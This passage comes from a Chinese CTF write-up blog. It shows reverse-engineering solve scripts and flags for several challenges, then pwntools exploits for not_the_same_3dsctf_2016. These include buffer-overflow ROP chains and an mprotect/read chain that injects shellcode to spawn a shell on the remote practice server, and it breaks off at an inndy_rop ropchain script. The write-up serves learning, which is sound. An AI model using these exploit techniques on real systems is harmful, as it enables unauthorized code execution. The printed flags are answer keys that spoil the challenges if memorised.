class="line">&#125;;</span><br><span class="line"><span class="type">uint8_t</span> s3[] = &#123;</span><br><span class="line">        <span class="number">198</span>, <span class="number">33</span>, <span class="number">202</span>, <span class="number">191</span>, <span class="number">81</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">228</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">192</span>, <span class="number">84</span>, <span class="number">111</span>, <span class="number">143</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">193</span>,</span><br><span class="line">        <span class="number">235</span>, <span class="number">165</span>, <span class="number">52</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">178</span>, <span class="number">168</span>,</span><br><span class="line">        <span class="number">47</span>, <span class="number">244</span>, <span class="number">81</span>, <span class="number">142</span>, <span class="number">12</span>, <span class="number">204</span>, <span class="number">51</span>, <span class="number">83</span>, <span class="number">49</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">214</span>, <span class="number">202</span>, <span class="number">236</span>, <span class="number">212</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">45</span>;</span><br><span class="line">    <span class="type">uint8_t</span> s[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> v5 = <span class="number">0</span>, v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i) &#123;</span><br><span class="line">        v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        v6 = (v6 + key2_origin[v5]) % <span class="number">256</span>;</span><br><span class="line">        swap(key2_origin + v5, key2_origin + v6);</span><br><span class="line">        s[i] = s3[i] ^ (key2_origin[((<span class="type">int</span>) key2_origin[v5] + key2_origin[v6]) % <span class="number">256</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行的结果是一样的:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807225943226.png" alt="image-20230807225943226"></p><p>然后复制到python的解密脚本中转换成utf-8的字符串就行,不过貌似没有base64的事…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = []</span><br><span class="line">data = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">str</span> += <span class="built_in">chr</span>(<span class="built_in">int</span>(i))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\devtools\venu\Scripts\python.exe D:\Data\CTF\do\re_run.py </span><br><span class="line"><span class="number">110</span> <span class="number">49</span> <span class="number">98</span> <span class="number">111</span> <span class="number">111</span> <span class="number">107</span> <span class="number">123</span> <span class="number">117</span> <span class="number">115</span> <span class="number">49</span> <span class="number">110</span> <span class="number">71</span> <span class="number">95</span> <span class="number">102</span> <span class="number">51</span> <span class="number">97</span> <span class="number">116</span> <span class="number">117</span> <span class="number">114</span> <span class="number">51</span> <span class="number">115</span> <span class="number">95</span> <span class="number">55</span> <span class="number">111</span> <span class="number">95</span> <span class="number">100</span> <span class="number">101</span> <span class="number">55</span> <span class="number">101</span> <span class="number">114</span> <span class="number">109</span> <span class="number">49</span> <span class="number">110</span> <span class="number">51</span> <span class="number">95</span> <span class="number">52</span> <span class="number">108</span> <span class="number">103</span> <span class="number">48</span> <span class="number">114</span> <span class="number">105</span> <span class="number">55</span> <span class="number">104</span> <span class="number">109</span> <span class="number">125</span></span><br><span class="line">[<span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;98&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, <span class="string">&#x27;107&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;117&#x27;</span>, <span class="string">&#x27;115&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;71&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;102&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;116&#x27;</span>, <span class="string">&#x27;117&#x27;</span>, <span class="string">&#x27;114&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;115&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;100&#x27;</span>, <span class="string">&#x27;101&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;101&#x27;</span>, <span class="string">&#x27;114&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;108&#x27;</span>, <span class="string">&#x27;103&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;114&#x27;</span>, <span class="string">&#x27;105&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;104&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;125&#x27;</span>]</span><br><span class="line">n1book&#123;us1nG_f3atur3s_7o_de7erm1n3_4lg0ri7hm&#125;</span><br></pre></td></tr></table></figure><p>结束…</p><h2 id="slices"><a href="#slices" class="headerlink" title="slices"></a>slices</h2><p>这题简单…因为没题干把题目的源代码也放上来吧…</p><p>题目代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Enter flag: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fail</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">32</span>: fail()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[:<span class="number">5</span>] != <span class="string">&#x27;hope&#123;&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[-<span class="number">1</span>] != <span class="string">&#x27;&#125;&#x27;</span>: fail()</span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">5</span>::<span class="number">3</span>] != <span class="string">&#x27;i0_tnl3a0&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">4</span>::<span class="number">4</span>] != <span class="string">&#x27;&#123;0p0lsl&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">3</span>::<span class="number">5</span>] != <span class="string">&#x27;e0y_3l&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">6</span>::<span class="number">3</span>] != <span class="string">&#x27;_vph_is_t&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">7</span>::<span class="number">3</span>] != <span class="string">&#x27;ley0sc_l&#125;&#x27;</span>: fail() </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Congrats!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag is: &#x27;</span>, flag)</span><br></pre></td></tr></table></figure><p>就这么简单,写个脚本就行了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="string">&#x27;0&#x27;</span>] * <span class="number">32</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">source, start, end, step</span>):</span><br><span class="line">    idx = start</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(source)):</span><br><span class="line">        flag[idx] = source[i]</span><br><span class="line">        idx += step</span><br><span class="line">        <span class="keyword">if</span> idx &gt;= end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">go(<span class="string">&#x27;hope&#123;&#x27;</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">go(<span class="string">&#x27;i0_tnl3a0&#x27;</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">3</span>)</span><br><span class="line">go(<span class="string">&#x27;&#123;0p0lsl&#x27;</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">4</span>)</span><br><span class="line">go(<span class="string">&#x27;e0y_3l&#x27;</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">5</span>)</span><br><span class="line">go(<span class="string">&#x27;_vph_is_t&#x27;</span>, <span class="number">6</span>, <span class="number">32</span>, <span class="number">3</span>)</span><br><span class="line">go(<span class="string">&#x27;ley0sc_l&#125;&#x27;</span>, <span class="number">7</span>, <span class="number">32</span>, <span class="number">3</span>)</span><br><span class="line">flag_str = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag_str)</span><br></pre></td></tr></table></figure><p>不出意外的话答案应该没啥问题…(解密脚本写的不咋地…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807233325281.png" alt="image-20230807233325281"></p><p>hope{i_l0ve_pyth0n_slic3s_a_l0t}</p><p>结束…</p><h2 id="super-anti-scalper-solution-9000"><a href="#super-anti-scalper-solution-9000" class="headerlink" title="super anti scalper solution 9000"></a>super anti scalper solution 9000</h2><p>这个题就是JS混淆,代码很简单,我们其实只需要一件事:</p><p>​JS中任何对象都是true….</p><p>还有一件事:</p><p>​!![]把[]转换为布尔值,又[]是一个对象,所以他是true,然后!取反,!再取反,所以!![]的值就是true</p><p>还有一件事:</p><p>​!![]+!![]对2个true进行相加,显然true是1,那么答案就是1+1</p><p>所以首先就把!![]全部换成1,方便查看:<del>其实不替换也行…</del></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808095802372.png" alt="image-20230808095802372"></p><p>很显然,输入的字符串就是n,然后在第27行进行了比较,所以其实直接把27行n&#x3D;&#x3D;&#x3D;后面那一串输出就行…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808100000896.png" alt="image-20230808100000896"></p><p>运行结果(记得按一下按钮):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808103948072.png" alt="image-20230808103948072" style="zoom:45%;" /><p>hope{sHoe_1ddbf55508afcc08_sold!}</p><p>结束…</p><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>这题…给了代码…那就不是题了…</p><p>解释直接放注释了,运行出来的结果就是flag:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123; <span class="comment">//3个参数 51966 25 h4cky0u</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;<span class="comment">//51966</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;<span class="comment">//25</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808105306027.png" alt="image-20230808105306027"></p><p>结束…</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>我只能说这个题对于我有点新了…貌似有两个做法,但是第一个做法那个exit()不太会搞,先放了吧…</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>这个题,乍一看是一个ret2next,但是…一开始本地能跑通,远程不过…后续发现大概是缓冲区刷新的问题,于是让printf继续返回到exit()以进行缓冲区刷新即可通过</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809114710444.png" alt="image-20230809114710444"></p><p>开幕雷击(爽击)…gets()就躺在那里,所以我们肯定是要从main开始ret,不过注意一个问题,那就是没有push ebp了(具体去看main的汇编)</p><p>但是除此之外没有调用任何的函数,那就去找吧,去尝试找”flag”字符串发现第一个就是,然后双击过去到汇编(?),接下来按Ctrl+x快捷键跳转到使用了这个字符串的函数,发现是一个get_secret()函数:</p><p>有一个flag.txt文件相关的字符串:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809115015923.png" alt="image-20230809115015923"></p><p>双击过去:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809115051406.png" alt="image-20230809115051406"></p><p>ctrl+x跳转,然后f5查看:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809115244164.png" alt="image-20230809115244164"></p><p>这个函数将flag.txt写入了fl4g这个地方(可寻址),那么我们接下来的事就是想办法跳转到get_secret()然后再用printf或者write之类的输出就行:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25763</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">getflag_addr = <span class="number">0x080489A0</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span></span><br><span class="line">exit_addr = <span class="number">0x0804E660</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x4006b3 #64位用到</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span> + <span class="number">4</span> * <span class="number">0</span>) + p32(getflag_addr)</span><br><span class="line"><span class="comment">#payload += p32(printf_addr) + p32(1) + p32(flag_addr)</span></span><br><span class="line">payload += p32(printf_addr) + p32(exit_addr) + p32(flag_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本地创建一个flag.txt测试一下没问题,然后把p32(1)改成p32(exit_addr),远程也能通过了:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809131447147.png" alt="image-20230809131447147"></p><p>或者这样用fflush也行,不过那个stdout的地址不是直接找到的那个,调试找出来的,先记录一下再说:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25763</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">getflag_addr = <span class="number">0x080489A0</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span></span><br><span class="line">exit_addr = <span class="number">0x0804E660</span></span><br><span class="line">fflush_addr = <span class="number">0x0804F3A0</span></span><br><span class="line">stdout_addr = <span class="number">0x80EB200</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x4006b3 #64位用到</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span> + <span class="number">4</span> * <span class="number">0</span>) + p32(getflag_addr)</span><br><span class="line">payload += p32(printf_addr) + p32(fflush_addr) + p32(flag_addr)</span><br><span class="line"><span class="comment"># payload += p32(printf_addr) + p32(exit_addr) + p32(flag_addr)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(stdout_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个用fflush也行,就是stdout这个文件指针一下子没找到正确的那个</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这个应该是正解吧…或者可能是出题人疏忽了没搞三件套?(啥是三件套QWQ)</p><p>ret2shell的做法:</p><p>首先用checksec看看,发现有NX保护</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809132028022.png" alt="image-20230809132028022"></p><p>然后IDA中发现了mprotect():</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809131755622.png" alt="image-20230809131755622"></p><p>int mprotect(void *addr, size_t len, int prot)</p><p>三个参数分别是修改的起始地址，长度，修改为的权限</p><p>首先用这个函数去把.bss提权为可写权限(直接用7就行)</p><p>然后利用read进行shellcode的植入(read函数进行unix的读写)</p><p>接着就跳转到shellcode的位置进行getshell即可</p><p>注意:因为参数为3个,所以需要一个pop三连+ret的指令,这里用</p><p><code>ROPgadget --binary not_the_same_3dsctf_2016 --only &#39;pop|ret&#39; | grep pop</code></p><p>来获取,随便一个就行,例如:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809134557805.png" alt="image-20230809134557805" style="zoom:45%;" /><p>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25763</span>)</span><br><span class="line">mprotect_addr = <span class="number">0x0806ED40</span></span><br><span class="line"><span class="comment"># getflag_addr = 0x080489A0</span></span><br><span class="line"><span class="comment"># flag_addr = 0x080ECA2D</span></span><br><span class="line">pppr_addr = <span class="number">0x0806fcf0</span>  <span class="comment"># 使用ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27; | grep pop取得</span></span><br><span class="line">bss_addr = <span class="number">0x080EB000</span></span><br><span class="line">size = <span class="number">0x1000</span></span><br><span class="line">read_addr = <span class="number">0x0806E200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mprotect</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span> + <span class="number">4</span> * <span class="number">0</span>) + p32(mprotect_addr) + p32(pppr_addr) + p32(bss_addr) + p32(size) + p32(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># read --- 从stdin(0)即标准输入读取到bss_addr中</span></span><br><span class="line">payload += p32(read_addr) + p32(pppr_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(size)</span><br><span class="line"><span class="comment"># run shellcode</span></span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一直进行到read准备getshell</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode的读取(asm函数百度来的...)</span></span><br><span class="line">payload1=asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参见:</p><p><a href="https://blog.csdn.net/Kata_Jhin/article/details/129540833?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22129540833%22,%22source%22:%22Kata_Jhin%22%7D">https://blog.csdn.net/Kata_Jhin/article/details/129540833?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22129540833%22%2C%22source%22%3A%22Kata_Jhin%22%7D</a></p><p>(不是一个题,但是做法差不多一样…)</p><p>结束…</p><h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a>inndy_rop</h2><p>这道题是rop…ret2syscall…</p><p>ROPgadget是真的好用啊………</p><p>那么我正好看了某个文章:</p><p><a href="https://repw.github.io/2018/10/27/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8BROP%E5%9F%BA%E7%A1%80/#undefined">https://repw.github.io/2018/10/27/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8BROP%E5%9F%BA%E7%A1%80/#undefined</a></p><p>关于系统调用号:</p><p>​截图取自:<a href="https://blog.csdn.net/kaiandshan/article/details/44587225">https://blog.csdn.net/kaiandshan/article/details/44587225</a></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230812235944050.png" alt="image-20230812235944050" style="zoom: 50%;" /></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析:"></a>题目分析:</h3><p>代码非常简单,直接从一个overflow函数中gets()溢出,但是发现没有system()这些可利用的东西</p><p>所以是一个rop的题,那么既然是rop,就去用ROPgadget找rop</p><p>首先,最粗暴的方法就是直接用ROPgadget的一个奇葩功能直接生成shellcode,然后粘贴进脚本,加上偏移就行…</p><p><code>ROPgadget --binary rop --ropchain</code></p><p>使用该命令就会自动生成rop链,粘贴进脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># 